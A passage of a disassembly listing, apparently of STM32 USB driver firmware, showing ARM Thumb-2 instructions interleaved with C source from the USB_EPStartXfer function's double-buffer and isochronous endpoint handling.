 8007a60:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a64:	881b      	ldrh	r3, [r3, #0]
 8007a66:	b29a      	uxth	r2, r3
 8007a68:	f8d7 30e4 	ldr.w	r3, [r7, #228]	; 0xe4
 8007a6c:	b29b      	uxth	r3, r3
 8007a6e:	029b      	lsls	r3, r3, #10
 8007a70:	b29b      	uxth	r3, r3
 8007a72:	4313      	orrs	r3, r2
 8007a74:	b29a      	uxth	r2, r3
 8007a76:	f8d7 30a8 	ldr.w	r3, [r7, #168]	; 0xa8
 8007a7a:	801a      	strh	r2, [r3, #0]
 8007a7c:	e034      	b.n	8007ae8 <USB_EPStartXfer+0x10ea>
 8007a7e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a82:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007a86:	681b      	ldr	r3, [r3, #0]
 8007a88:	785b      	ldrb	r3, [r3, #1]
 8007a8a:	2b01      	cmp	r3, #1
 8007a8c:	d12c      	bne.n	8007ae8 <USB_EPStartXfer+0x10ea>
 8007a8e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007a92:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007a96:	681b      	ldr	r3, [r3, #0]
 8007a98:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007a9c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007aa0:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007aa4:	681b      	ldr	r3, [r3, #0]
 8007aa6:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007aaa:	b29b      	uxth	r3, r3
 8007aac:	461a      	mov	r2, r3
 8007aae:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007ab2:	4413      	add	r3, r2
 8007ab4:	f8c7 30b4 	str.w	r3, [r7, #180]	; 0xb4
 8007ab8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007abc:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ac0:	681b      	ldr	r3, [r3, #0]
 8007ac2:	781b      	ldrb	r3, [r3, #0]
 8007ac4:	00da      	lsls	r2, r3, #3
 8007ac6:	f8d7 30b4 	ldr.w	r3, [r7, #180]	; 0xb4
 8007aca:	4413      	add	r3, r2
 8007acc:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007ad0:	f8c7 30b0 	str.w	r3, [r7, #176]	; 0xb0
 8007ad4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ad8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007adc:	681b      	ldr	r3, [r3, #0]
 8007ade:	691b      	ldr	r3, [r3, #16]
 8007ae0:	b29a      	uxth	r2, r3
 8007ae2:	f8d7 30b0 	ldr.w	r3, [r7, #176]	; 0xb0
 8007ae6:	801a      	strh	r2, [r3, #0]
 8007ae8:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007aec:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007af0:	681b      	ldr	r3, [r3, #0]
 8007af2:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007af6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007afa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007afe:	681b      	ldr	r3, [r3, #0]
 8007b00:	785b      	ldrb	r3, [r3, #1]
 8007b02:	2b00      	cmp	r3, #0
 8007b04:	f040 809d 	bne.w	8007c42 <USB_EPStartXfer+0x1244>
 8007b08:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b0c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b10:	681b      	ldr	r3, [r3, #0]
 8007b12:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007b16:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b1a:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007b1e:	681b      	ldr	r3, [r3, #0]
 8007b20:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007b24:	b29b      	uxth	r3, r3
 8007b26:	461a      	mov	r2, r3
 8007b28:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007b2c:	4413      	add	r3, r2
 8007b2e:	f8c7 309c 	str.w	r3, [r7, #156]	; 0x9c
 8007b32:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b36:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b3a:	681b      	ldr	r3, [r3, #0]
 8007b3c:	781b      	ldrb	r3, [r3, #0]
 8007b3e:	00da      	lsls	r2, r3, #3
 8007b40:	f8d7 309c 	ldr.w	r3, [r7, #156]	; 0x9c
 8007b44:	4413      	add	r3, r2
 8007b46:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007b4a:	f8c7 3098 	str.w	r3, [r7, #152]	; 0x98
 8007b4e:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007b52:	881b      	ldrh	r3, [r3, #0]
 8007b54:	b29b      	uxth	r3, r3
 8007b56:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007b5a:	b29a      	uxth	r2, r3
 8007b5c:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007b60:	801a      	strh	r2, [r3, #0]
 8007b62:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b66:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b6a:	681b      	ldr	r3, [r3, #0]
 8007b6c:	691b      	ldr	r3, [r3, #16]
 8007b6e:	2b3e      	cmp	r3, #62	; 0x3e
 8007b70:	d92b      	bls.n	8007bca <USB_EPStartXfer+0x11cc>
 8007b72:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b76:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b7a:	681b      	ldr	r3, [r3, #0]
 8007b7c:	691b      	ldr	r3, [r3, #16]
 8007b7e:	095b      	lsrs	r3, r3, #5
 8007b80:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007b84:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007b88:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007b8c:	681b      	ldr	r3, [r3, #0]
 8007b8e:	691b      	ldr	r3, [r3, #16]
 8007b90:	f003 031f 	and.w	r3, r3, #31
 8007b94:	2b00      	cmp	r3, #0
 8007b96:	d104      	bne.n	8007ba2 <USB_EPStartXfer+0x11a4>
 8007b98:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007b9c:	3b01      	subs	r3, #1
 8007b9e:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007ba2:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007ba6:	881b      	ldrh	r3, [r3, #0]
 8007ba8:	b29a      	uxth	r2, r3
 8007baa:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007bae:	b29b      	uxth	r3, r3
 8007bb0:	029b      	lsls	r3, r3, #10
 8007bb2:	b29b      	uxth	r3, r3
 8007bb4:	4313      	orrs	r3, r2
 8007bb6:	b29b      	uxth	r3, r3
 8007bb8:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007bbc:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007bc0:	b29a      	uxth	r2, r3
 8007bc2:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007bc6:	801a      	strh	r2, [r3, #0]
 8007bc8:	e069      	b.n	8007c9e <USB_EPStartXfer+0x12a0>
 8007bca:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bce:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bd2:	681b      	ldr	r3, [r3, #0]
 8007bd4:	691b      	ldr	r3, [r3, #16]
 8007bd6:	2b00      	cmp	r3, #0
 8007bd8:	d10c      	bne.n	8007bf4 <USB_EPStartXfer+0x11f6>
 8007bda:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007bde:	881b      	ldrh	r3, [r3, #0]
 8007be0:	b29b      	uxth	r3, r3
 8007be2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007be6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007bea:	b29a      	uxth	r2, r3
 8007bec:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007bf0:	801a      	strh	r2, [r3, #0]
 8007bf2:	e054      	b.n	8007c9e <USB_EPStartXfer+0x12a0>
 8007bf4:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007bf8:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007bfc:	681b      	ldr	r3, [r3, #0]
 8007bfe:	691b      	ldr	r3, [r3, #16]
 8007c00:	085b      	lsrs	r3, r3, #1
 8007c02:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007c06:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c0a:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c0e:	681b      	ldr	r3, [r3, #0]
 8007c10:	691b      	ldr	r3, [r3, #16]
 8007c12:	f003 0301 	and.w	r3, r3, #1
 8007c16:	2b00      	cmp	r3, #0
 8007c18:	d004      	beq.n	8007c24 <USB_EPStartXfer+0x1226>
 8007c1a:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007c1e:	3301      	adds	r3, #1
 8007c20:	f8c7 30e0 	str.w	r3, [r7, #224]	; 0xe0
 8007c24:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c28:	881b      	ldrh	r3, [r3, #0]
 8007c2a:	b29a      	uxth	r2, r3
 8007c2c:	f8d7 30e0 	ldr.w	r3, [r7, #224]	; 0xe0
 8007c30:	b29b      	uxth	r3, r3
 8007c32:	029b      	lsls	r3, r3, #10
 8007c34:	b29b      	uxth	r3, r3
 8007c36:	4313      	orrs	r3, r2
 8007c38:	b29a      	uxth	r2, r3
 8007c3a:	f8d7 3098 	ldr.w	r3, [r7, #152]	; 0x98
 8007c3e:	801a      	strh	r2, [r3, #0]
 8007c40:	e02d      	b.n	8007c9e <USB_EPStartXfer+0x12a0>
 8007c42:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c46:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c4a:	681b      	ldr	r3, [r3, #0]
 8007c4c:	785b      	ldrb	r3, [r3, #1]
 8007c4e:	2b01      	cmp	r3, #1
 8007c50:	d125      	bne.n	8007c9e <USB_EPStartXfer+0x12a0>
 8007c52:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c56:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007c5a:	681b      	ldr	r3, [r3, #0]
 8007c5c:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007c60:	b29b      	uxth	r3, r3
 8007c62:	461a      	mov	r2, r3
 8007c64:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007c68:	4413      	add	r3, r2
 8007c6a:	f8c7 30a4 	str.w	r3, [r7, #164]	; 0xa4
 8007c6e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c72:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c76:	681b      	ldr	r3, [r3, #0]
 8007c78:	781b      	ldrb	r3, [r3, #0]
 8007c7a:	00da      	lsls	r2, r3, #3
 8007c7c:	f8d7 30a4 	ldr.w	r3, [r7, #164]	; 0xa4
 8007c80:	4413      	add	r3, r2
 8007c82:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8007c86:	f8c7 30a0 	str.w	r3, [r7, #160]	; 0xa0
 8007c8a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007c8e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007c92:	681b      	ldr	r3, [r3, #0]
 8007c94:	691b      	ldr	r3, [r3, #16]
 8007c96:	b29a      	uxth	r2, r3
 8007c98:	f8d7 30a0 	ldr.w	r3, [r7, #160]	; 0xa0
 8007c9c:	801a      	strh	r2, [r3, #0]

        /* Coming from ISR */
        if (ep->xfer_count != 0U)
 8007c9e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007ca2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007ca6:	681b      	ldr	r3, [r3, #0]
 8007ca8:	69db      	ldr	r3, [r3, #28]
 8007caa:	2b00      	cmp	r3, #0
 8007cac:	f000 8218 	beq.w	80080e0 <USB_EPStartXfer+0x16e2>
        {
          /* update last value to check if there is blocking state */
          wEPVal = PCD_GET_ENDPOINT(USBx, ep->num);
 8007cb0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cb4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007cb8:	681a      	ldr	r2, [r3, #0]
 8007cba:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007cbe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007cc2:	681b      	ldr	r3, [r3, #0]
 8007cc4:	781b      	ldrb	r3, [r3, #0]
 8007cc6:	009b      	lsls	r3, r3, #2
 8007cc8:	4413      	add	r3, r2
 8007cca:	881b      	ldrh	r3, [r3, #0]
 8007ccc:	f8a7 3096 	strh.w	r3, [r7, #150]	; 0x96

          /*Blocking State */
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007cd0:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007cd4:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8007cd8:	2b00      	cmp	r3, #0
 8007cda:	d005      	beq.n	8007ce8 <USB_EPStartXfer+0x12ea>
 8007cdc:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007ce0:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007ce4:	2b00      	cmp	r3, #0
 8007ce6:	d10d      	bne.n	8007d04 <USB_EPStartXfer+0x1306>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007ce8:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007cec:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
          if ((((wEPVal & USB_EP_DTOG_RX) != 0U) && ((wEPVal & USB_EP_DTOG_TX) != 0U)) ||
 8007cf0:	2b00      	cmp	r3, #0
 8007cf2:	f040 81f5 	bne.w	80080e0 <USB_EPStartXfer+0x16e2>
              (((wEPVal & USB_EP_DTOG_RX) == 0U) && ((wEPVal & USB_EP_DTOG_TX) == 0U)))
 8007cf6:	f8b7 3096 	ldrh.w	r3, [r7, #150]	; 0x96
 8007cfa:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8007cfe:	2b00      	cmp	r3, #0
 8007d00:	f040 81ee 	bne.w	80080e0 <USB_EPStartXfer+0x16e2>
          {
            PCD_FREE_USER_BUFFER(USBx, ep->num, 0U);
 8007d04:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d08:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d0c:	681a      	ldr	r2, [r3, #0]
 8007d0e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d12:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d16:	681b      	ldr	r3, [r3, #0]
 8007d18:	781b      	ldrb	r3, [r3, #0]
 8007d1a:	009b      	lsls	r3, r3, #2
 8007d1c:	4413      	add	r3, r2
 8007d1e:	881b      	ldrh	r3, [r3, #0]
 8007d20:	b29b      	uxth	r3, r3
 8007d22:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8007d26:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8007d2a:	f8a7 3094 	strh.w	r3, [r7, #148]	; 0x94
 8007d2e:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d32:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007d36:	681a      	ldr	r2, [r3, #0]
 8007d38:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d3c:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d40:	681b      	ldr	r3, [r3, #0]
 8007d42:	781b      	ldrb	r3, [r3, #0]
 8007d44:	009b      	lsls	r3, r3, #2
 8007d46:	441a      	add	r2, r3
 8007d48:	f8b7 3094 	ldrh.w	r3, [r7, #148]	; 0x94
 8007d4c:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8007d50:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 8007d54:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8007d58:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8007d5c:	b29b      	uxth	r3, r3
 8007d5e:	8013      	strh	r3, [r2, #0]
 8007d60:	e1be      	b.n	80080e0 <USB_EPStartXfer+0x16e2>
          }
        }
      }
      /* iso out double */
      else if (ep->type == EP_TYPE_ISOC)
 8007d62:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d66:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d6a:	681b      	ldr	r3, [r3, #0]
 8007d6c:	78db      	ldrb	r3, [r3, #3]
 8007d6e:	2b01      	cmp	r3, #1
 8007d70:	f040 81b4 	bne.w	80080dc <USB_EPStartXfer+0x16de>
      {
        /* Multi packet transfer */
        if (ep->xfer_len > ep->maxpacket)
 8007d74:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d78:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d7c:	681b      	ldr	r3, [r3, #0]
 8007d7e:	699a      	ldr	r2, [r3, #24]
 8007d80:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d84:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d88:	681b      	ldr	r3, [r3, #0]
 8007d8a:	691b      	ldr	r3, [r3, #16]
 8007d8c:	429a      	cmp	r2, r3
 8007d8e:	d917      	bls.n	8007dc0 <USB_EPStartXfer+0x13c2>
        {
          len = ep->maxpacket;
 8007d90:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007d94:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007d98:	681b      	ldr	r3, [r3, #0]
 8007d9a:	691b      	ldr	r3, [r3, #16]
 8007d9c:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len -= len;
 8007da0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007da4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007da8:	681b      	ldr	r3, [r3, #0]
 8007daa:	699a      	ldr	r2, [r3, #24]
 8007dac:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007db0:	1ad2      	subs	r2, r2, r3
 8007db2:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007db6:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dba:	681b      	ldr	r3, [r3, #0]
 8007dbc:	619a      	str	r2, [r3, #24]
 8007dbe:	e00e      	b.n	8007dde <USB_EPStartXfer+0x13e0>
        }
        else
        {
          len = ep->xfer_len;
 8007dc0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dc4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dc8:	681b      	ldr	r3, [r3, #0]
 8007dca:	699b      	ldr	r3, [r3, #24]
 8007dcc:	f8c7 3104 	str.w	r3, [r7, #260]	; 0x104
          ep->xfer_len = 0U;
 8007dd0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007dd4:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007dd8:	681b      	ldr	r3, [r3, #0]
 8007dda:	2200      	movs	r2, #0
 8007ddc:	619a      	str	r2, [r3, #24]
        }
        PCD_SET_EP_DBUF_CNT(USBx, ep->num, ep->is_in, len);
 8007dde:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007de2:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007de6:	681b      	ldr	r3, [r3, #0]
 8007de8:	785b      	ldrb	r3, [r3, #1]
 8007dea:	2b00      	cmp	r3, #0
 8007dec:	f040 8085 	bne.w	8007efa <USB_EPStartXfer+0x14fc>
 8007df0:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007df4:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007df8:	681b      	ldr	r3, [r3, #0]
 8007dfa:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 8007dfe:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e02:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007e06:	681b      	ldr	r3, [r3, #0]
 8007e08:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007e0c:	b29b      	uxth	r3, r3
 8007e0e:	461a      	mov	r2, r3
 8007e10:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8007e14:	4413      	add	r3, r2
 8007e16:	f8c7 30cc 	str.w	r3, [r7, #204]	; 0xcc
 8007e1a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007e1e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007e22:	681b      	ldr	r3, [r3, #0]
 8007e24:	781b      	ldrb	r3, [r3, #0]
 8007e26:	00da      	lsls	r2, r3, #3
 8007e28:	f8d7 30cc 	ldr.w	r3, [r7, #204]	; 0xcc
 8007e2c:	4413      	add	r3, r2
 8007e2e:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007e32:	f8c7 30c8 	str.w	r3, [r7, #200]	; 0xc8
 8007e36:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007e3a:	881b      	ldrh	r3, [r3, #0]
 8007e3c:	b29b      	uxth	r3, r3
 8007e3e:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8007e42:	b29a      	uxth	r2, r3
 8007e44:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007e48:	801a      	strh	r2, [r3, #0]
 8007e4a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e4e:	2b3e      	cmp	r3, #62	; 0x3e
 8007e50:	d923      	bls.n	8007e9a <USB_EPStartXfer+0x149c>
 8007e52:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e56:	095b      	lsrs	r3, r3, #5
 8007e58:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007e5c:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e60:	f003 031f 	and.w	r3, r3, #31
 8007e64:	2b00      	cmp	r3, #0
 8007e66:	d104      	bne.n	8007e72 <USB_EPStartXfer+0x1474>
 8007e68:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007e6c:	3b01      	subs	r3, #1
 8007e6e:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007e72:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007e76:	881b      	ldrh	r3, [r3, #0]
 8007e78:	b29a      	uxth	r2, r3
 8007e7a:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007e7e:	b29b      	uxth	r3, r3
 8007e80:	029b      	lsls	r3, r3, #10
 8007e82:	b29b      	uxth	r3, r3
 8007e84:	4313      	orrs	r3, r2
 8007e86:	b29b      	uxth	r3, r3
 8007e88:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007e8c:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007e90:	b29a      	uxth	r2, r3
 8007e92:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007e96:	801a      	strh	r2, [r3, #0]
 8007e98:	e060      	b.n	8007f5c <USB_EPStartXfer+0x155e>
 8007e9a:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007e9e:	2b00      	cmp	r3, #0
 8007ea0:	d10c      	bne.n	8007ebc <USB_EPStartXfer+0x14be>
 8007ea2:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007ea6:	881b      	ldrh	r3, [r3, #0]
 8007ea8:	b29b      	uxth	r3, r3
 8007eaa:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8007eae:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8007eb2:	b29a      	uxth	r2, r3
 8007eb4:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007eb8:	801a      	strh	r2, [r3, #0]
 8007eba:	e04f      	b.n	8007f5c <USB_EPStartXfer+0x155e>
 8007ebc:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007ec0:	085b      	lsrs	r3, r3, #1
 8007ec2:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007ec6:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007eca:	f003 0301 	and.w	r3, r3, #1
 8007ece:	2b00      	cmp	r3, #0
 8007ed0:	d004      	beq.n	8007edc <USB_EPStartXfer+0x14de>
 8007ed2:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007ed6:	3301      	adds	r3, #1
 8007ed8:	f8c7 30dc 	str.w	r3, [r7, #220]	; 0xdc
 8007edc:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007ee0:	881b      	ldrh	r3, [r3, #0]
 8007ee2:	b29a      	uxth	r2, r3
 8007ee4:	f8d7 30dc 	ldr.w	r3, [r7, #220]	; 0xdc
 8007ee8:	b29b      	uxth	r3, r3
 8007eea:	029b      	lsls	r3, r3, #10
 8007eec:	b29b      	uxth	r3, r3
 8007eee:	4313      	orrs	r3, r2
 8007ef0:	b29a      	uxth	r2, r3
 8007ef2:	f8d7 30c8 	ldr.w	r3, [r7, #200]	; 0xc8
 8007ef6:	801a      	strh	r2, [r3, #0]
 8007ef8:	e030      	b.n	8007f5c <USB_EPStartXfer+0x155e>
 8007efa:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007efe:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f02:	681b      	ldr	r3, [r3, #0]
 8007f04:	785b      	ldrb	r3, [r3, #1]
 8007f06:	2b01      	cmp	r3, #1
 8007f08:	d128      	bne.n	8007f5c <USB_EPStartXfer+0x155e>
 8007f0a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f0e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f12:	681b      	ldr	r3, [r3, #0]
 8007f14:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 8007f18:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f1c:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f20:	681b      	ldr	r3, [r3, #0]
 8007f22:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007f26:	b29b      	uxth	r3, r3
 8007f28:	461a      	mov	r2, r3
 8007f2a:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 8007f2e:	4413      	add	r3, r2
 8007f30:	f8c7 30d4 	str.w	r3, [r7, #212]	; 0xd4
 8007f34:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f38:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f3c:	681b      	ldr	r3, [r3, #0]
 8007f3e:	781b      	ldrb	r3, [r3, #0]
 8007f40:	00da      	lsls	r2, r3, #3
 8007f42:	f8d7 30d4 	ldr.w	r3, [r7, #212]	; 0xd4
 8007f46:	4413      	add	r3, r2
 8007f48:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8007f4c:	f8c7 30d0 	str.w	r3, [r7, #208]	; 0xd0
 8007f50:	f8d7 3104 	ldr.w	r3, [r7, #260]	; 0x104
 8007f54:	b29a      	uxth	r2, r3
 8007f56:	f8d7 30d0 	ldr.w	r3, [r7, #208]	; 0xd0
 8007f5a:	801a      	strh	r2, [r3, #0]
 8007f5c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f60:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f64:	681b      	ldr	r3, [r3, #0]
 8007f66:	f8c7 30c4 	str.w	r3, [r7, #196]	; 0xc4
 8007f6a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f6e:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007f72:	681b      	ldr	r3, [r3, #0]
 8007f74:	785b      	ldrb	r3, [r3, #1]
 8007f76:	2b00      	cmp	r3, #0
 8007f78:	f040 8085 	bne.w	8008086 <USB_EPStartXfer+0x1688>
 8007f7c:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f80:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f84:	681b      	ldr	r3, [r3, #0]
 8007f86:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 8007f8a:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007f8e:	f5a3 7382 	sub.w	r3, r3, #260	; 0x104
 8007f92:	681b      	ldr	r3, [r3, #0]
 8007f94:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8007f98:	b29b      	uxth	r3, r3
 8007f9a:	461a      	mov	r2, r3
 8007f9c:	f8d7 30bc 	ldr.w	r3, [r7, #188]	; 0xbc
 8007fa0:	4413      	add	r3, r2
 8007fa2:	f8c7 30bc 	str.w	r3, [r7, #188]	; 0xbc
 8007fa6:	f507 7384 	add.w	r3, r7, #264	; 0x108
 8007faa:	f5a3 7384 	sub.w	r3, r3, #264	; 0x108
 8007fae:	681b      	ldr	r3, [r3, #0]
 8007fb0:	781b      	ldrb	r3, [r3, #0]
 8007fb2:	00da      	lsls	r2, r3, #3
